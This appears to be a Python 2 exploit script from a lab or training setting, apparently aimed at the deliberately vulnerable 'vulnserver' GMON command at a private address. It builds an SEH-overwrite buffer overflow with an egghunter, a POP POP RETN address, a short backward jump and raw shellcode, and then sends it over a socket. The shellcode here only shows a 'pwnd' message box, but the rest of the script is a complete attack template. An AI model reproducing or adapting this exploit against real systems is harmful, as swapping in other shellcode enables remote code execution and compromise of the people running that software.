#!/usr/bin/python
#MessageBoxA: Display pwnd

import socket
import os
import sys

#[*] Exact match at offset 3499

#625010b4    POP POP RETN
#EB D0       Negative Short Jump
#\x70 - p
#\x77 - w
#\x6E - n
#\x64 - d

#Egg
egg = "w00tw00t" #\x77\x30\x30\x74

#MessageBoxA
pwnd = "\x70\x77\x6E\x64"
mbox = "\x31\xc0\x50\xbb" + pwnd + "\x53\x89\xe6\x31\xc0\x50\x56\x56\x50\xb8\xea\x07\x45\x7e\xff\xd0"

#Egghunter - 32 bytes
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
nseh = "\x90\x90\xEB\xD0"
seh = "\xB3\x11\x50\x62"

buffer="GMON /.:/" + egg + mbox +  "A"*(3447 - len(mbox)) + "\x90"*8 + egghunter + nseh + seh + "C"*(5009 - 3503)

print "[*] Sending evil GMON request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.27", 9999))
expl.send(buffer)
expl.close()
